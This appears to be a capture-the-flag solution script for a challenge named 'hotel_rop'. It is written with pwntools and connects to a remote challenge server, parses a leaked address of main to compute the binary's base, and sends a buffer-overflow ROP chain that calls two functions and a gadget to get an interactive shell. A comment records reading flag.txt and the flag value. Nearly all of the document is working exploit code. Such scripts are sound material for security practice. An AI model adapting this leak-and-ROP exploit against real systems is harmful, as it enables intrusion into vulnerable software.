#!/usr/bin/env python

from pwn import *
context.binary = elf = ELF("./hotel_rop")

io = remote("dctf1-chall-hotel-rop.westeurope.azurecontainer.io", 7480)
#io = elf.process()

io.readuntil("street ")
main_leak = int(io.readline().strip(),16)
elf.address = main_leak - elf.symbols['main']

payload = "A"*0x28
payload += p64(elf.symbols['california'])
payload += p64(elf.symbols['silicon_valley'])
payload += p64(elf.address +0x11c3)

io.sendline(payload)
io.interactive()

# cat flag.txt
# dctf{ch41n_0f_h0t3ls}